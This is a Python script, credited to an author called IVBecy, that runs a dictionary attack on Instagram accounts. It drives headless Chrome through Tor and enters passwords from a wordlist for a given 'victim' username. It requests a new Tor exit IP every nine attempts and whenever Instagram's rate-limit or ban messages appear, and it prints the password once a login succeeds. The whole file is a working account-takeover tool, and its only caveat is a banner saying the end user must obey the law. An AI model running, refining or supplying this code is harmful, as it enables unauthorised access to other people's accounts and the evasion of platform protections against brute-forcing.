#Importing modules / libraries
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from stem import Signal
from stem.control import Controller
import time
import sys
import os

#Pretty self explanatory
def banner():
    print("""
-----------------------------------------------
|---------------------------------------------|
|        Instagram Dictionary Attack          |
|---------------------------------------------|
| # Author: IVBecy                            |
|                                             |
| # This script uses TOR proxies              |
|                                             |
| # It is the end user's responsibility       |
|  to obey all applicable laws.               |
|                                             |
|---------------------------------------------|
-----------------------------------------------
    """)

#USAGE
def usage():
    print("""\n
    Usage: py insta.py [-u] [-pl]
    -u : The username of the victim
    -pl : The passwordlist to be used
    """)
    sys.exit()

#########  Taking terminal commands  ###########

if sys.argv[1] != "-u":
    usage()

if sys.argv[1] == "-h":
    usage()

uname = sys.argv[2]


if sys.argv[3] != "-pl":
    usage()

passlist = sys.argv[4]

ips = []

#Function for counting all the lines in the text file
def file_length(fname):
        with open(fname) as f:
                for i, l in enumerate(f):
                        pass
        return i + 1


#Function for getting a new IP, through TOR
def renew_tor_ip():
    with Controller.from_port(port = 9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)


count = file_length(str(passlist))

###########  Setting up the driver  ###################

#Assigning TOR proxy
PROXY =  "socks5://127.0.0.1:9050"
#Adding the proxy to chrome
options = webdriver.ChromeOptions()
options.add_argument('--proxy-server=%s' % PROXY)
options.add_argument('headless')
options.add_argument('--log-level=3')
#Setting up the chromedriver
driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe') 

# VARS
a = 0
b = 1
n = 0

##### 1st time start up info  ######
print("\n")
banner()
print("Target: {} || Password List: {} || List length: {}".format(uname, passlist, file_length(str(passlist))))
time.sleep(5)
# Main Loop
while True:
    n += 1
    if n % 9 == 0:
        renew_tor_ip()
        driver.quit()
        #Assigning TOR proxy
        PROXY =  "socks5://127.0.0.1:9050"
        #Adding the proxy to chrome
        options = webdriver.ChromeOptions()
        options.add_argument('--proxy-server=%s' % PROXY)
        options.add_argument('headless')
        options.add_argument('--log-level=3')
        #Setting up the chromedriver
        driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe') 
        print("\n")
        print("This IP was used 9 times")
        print("Getting new IP...")
    # Separating words in the wordlist
    f = open(str(passlist),"r")
    passw = f.readlines()[a:b]
    for p in passw:
        p = str(p)
        p = p.replace("[", "")
        p = p.replace("]", "")
        p = p.replace("'", "")
        p = p.replace("\n", "")
        p = p.replace(",", "")
        print("\n")
    f.close()
    #Incrementing variables (lines)
    a += 1
    b += 1
    #INFO
    print("\n")
    print("-----------------------------")
    print("Password:", p)
    print("Try: ", n)
    print("-----------------------------")

##########################  Getting Instagram, and filling in the input fields  ##########################

    #Navigating to Instagram login page
    driver.get('https://www.instagram.com/accounts/login/')
    time.sleep(10)

    #Finding the username and password boxes
    username = driver.find_element_by_name("username")
    password = driver.find_element_by_name("password")

    #Entering username and password
    username.send_keys(str(uname))
    if len(p) < 6:
        p + "11111"
        password.send_keys(str(p + "11111"))
    else:
        password.send_keys(str(p))
    time.sleep(1)

    #Submitting, the password and the username
    submit = driver.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
    submit.click()
    time.sleep(10)

######################  Login Detection  ######### ############

    if "incorrect" in driver.page_source:
        print("Wrong password, no match")
        print("-----------------------------")
        time.sleep(1)

    elif "Page Not Found" in driver.page_source:
        a -= 1
        b -= 1
        print("\n")
        print("Lost Connection :(")
        print("Re-Connecting")
        time.sleep(2)
        renew_tor_ip()

    elif "Suspicious Login Attempt" in driver.page_source:
        print("\n")
        print("Password Found")
        print("The password is:", p)
        sys.exit()

    elif "Please wait a few minutes before you try again." in driver.page_source:
        a -= 1
        b -= 1
        print("\n")
        print("Instagram has banned this IP")
        print("Requesting new one")
        time.sleep(10)
        renew_tor_ip()

    elif 'class="no-js logged-in' in driver.page_source:
        print("\n")
        print("Password Found")
        print("The password is:", p)
        sys.exit()

    elif "We couldn't connect" in driver.page_source:
        a -= 1
        b -= 1
        print("\n")
        print("Instagram has banned this IP")
        print("Requesting new one")
        time.sleep(10)
        renew_tor_ip()

    elif "The username you entered doesn't belong to an account." in driver.page_source:
        print("\n")
        print("WRONG USERNAME")
        print("Check the username, and run the script again")
        sys.exit()

    elif 'There was a problem logging you into Instagram' in driver.page_source:
        for t in range(2):
            submit = driver.find_element_by_class_name('sqdOP.L3NKy.y3zKF')
            submit.click()
            time.sleep(3)
            if "incorrect" in driver.page_source:
                print("\n")
                print("Wrong password, no match")
                print("Trying another password")
                break
            elif "We couldn't connect" in driver.page_source:
                a -= 1
                b -= 1
                print("\n")
                print("Instagram has banned this IP")
                print("Requesting new one")
                time.sleep(10)
                renew_tor_ip()

            elif "Page Not Found" in driver.page_source:
                a -= 1
                b -= 1
                print("\n")
                print("Lost Connection :(")
                print("Re-Connecting")
                time.sleep(2)
                renew_tor_ip()

            elif "Suspicious Login Attempt" in driver.page_source:
                print("\n")
                print("Password Found")
                print("Username:", uname)
                print("The password is:", p)
                print("\n")
                sys.exit()

            elif 'class="no-js logged-in' in driver.page_source:
                print("\n")
                print("Password Found")
                print("Username:", uname)
                print("The password is:", p)
                print("\n")
                sys.exit()

            elif "The username you entered doesn't belong to an account." in driver.page_source:
                print("\n")
                print("WRONG USERNAME")
                print("Check the username, and run the script again")
                sys.exit()
            elif "Please wait a few minutes before you try again." in driver.page_source:
                a -= 1
                b -= 1
                print("\n")
                print("Instagram has banned this IP")
                print("Requesting new one")
                time.sleep(10)
                renew_tor_ip()

            else:
                continue
        if 'There was a problem logging you into Instagram' in driver.page_source:
            a -= 1
            b -= 1
            renew_tor_ip()
        
        elif "Page Not Found" in driver.page_source:
            a -= 1
            b -= 1
            print("\n")
            print("Lost Connection :(")
            print("Re-Connecting")
            time.sleep(2)
            renew_tor_ip()
            
        elif "Please wait a few minutes before you try again." in driver.page_source:
            a -= 1
            b -= 1
            print("\n")
            print("Instagram has banned this IP")
            print("Requesting new one")
            time.sleep(10)
            renew_tor_ip()

        elif 'class="no-js logged-in' in driver.page_source:
            print("\n")
            print("Password Found")
            print("Username:", uname)
            print("The password is:", p)
            print("\n")
            sys.exit()
